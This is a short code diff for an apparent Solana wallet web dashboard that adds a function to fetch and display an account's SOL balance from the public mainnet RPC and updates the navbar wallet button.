   APP.shortAddr=addr.slice(0,4)+'...'+addr.slice(-4);
   document.getElementById('dashAddr').textContent=APP.shortAddr;
   document.getElementById('walletNavLabel').textContent=APP.shortAddr;
+  fetchBal(addr);
   toast('🔄 Account switched: '+APP.shortAddr);
 }
 
+/* ── NAVBAR WALLET BUTTON ── */
 function updateNavBtn(){
   const btn=document.getElementById('walletNavBtn');
+  const lbl=document.getElementById('walletNavLabel');
   btn.classList.add('wc');
   btn.innerHTML=`<span style="width:7px;height:7px;background:#10b981;border-radius:50%;display:inline-block"></span><span id="walletNavLabel">${APP.shortAddr}</span>`;
   btn.onclick=toggleDash;
+}
+
+/* ── FETCH SOL BALANCE ── */
+async function fetchBal(addr){
+  try{
+    const r=await fetch('https://api.mainnet-beta.solana.com',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[addr,{commitment:'confirmed'}]})
+    });
+    const d=await r.json();
+    if(d.result?.value!=null){
+      const sol=(d.result.value/1e9).toFixed(4);
+      const el=document.getElementById('solBal');
+      if(el)el.textContent=sol+' SOL';
+    }
+  }catch{
+    const el=document.getElementById('solBal');
+    if(el)el.textContent='— SOL';
+  }
 }
 
 /* ── DASHBOARD ── */
